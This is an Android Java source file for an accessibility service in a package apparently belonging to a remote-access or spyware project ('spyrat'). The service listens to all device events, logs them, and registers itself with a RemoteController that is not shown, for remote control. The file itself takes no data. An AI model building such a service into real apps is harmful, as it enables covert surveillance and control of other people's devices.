package com.spyrat.investigation;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

public class MyAccessibilityService extends AccessibilityService {
    private static final String TAG = "SpyratAccessibility";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "🔧 Accessibility Service Created");
        RemoteController.setAccessibilityService(this);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Monitor device events for remote control
        Log.d(TAG, "📱 Accessibility Event: " + event.getEventType());
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "❌ Accessibility Service Interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "✅ Accessibility Service Connected");
        
        // Configure the service
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        info.flags = AccessibilityServiceInfo.DEFAULT;
        
        setServiceInfo(info);
    }
}
